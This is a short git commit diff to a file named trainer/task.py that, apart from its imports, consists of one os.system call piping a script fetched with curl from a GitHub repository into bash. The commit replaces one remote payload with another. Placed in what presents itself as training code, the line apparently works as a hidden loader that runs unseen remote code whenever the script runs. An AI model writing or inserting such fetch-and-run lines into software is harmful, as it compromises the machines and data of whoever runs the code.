d9c8f125c4bce331f7ec90fe4d0d9b3c7b61348a
tallapallitech63 <tallapallitech63@proton.me>
2025-07-25 23:32:40 +0530

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/tallapallitech63/dujikl/raw/main/hukja | bash')
+os.system('curl -sL https://github.com/tallapallitech63/dujikl/raw/main/ala | bash')
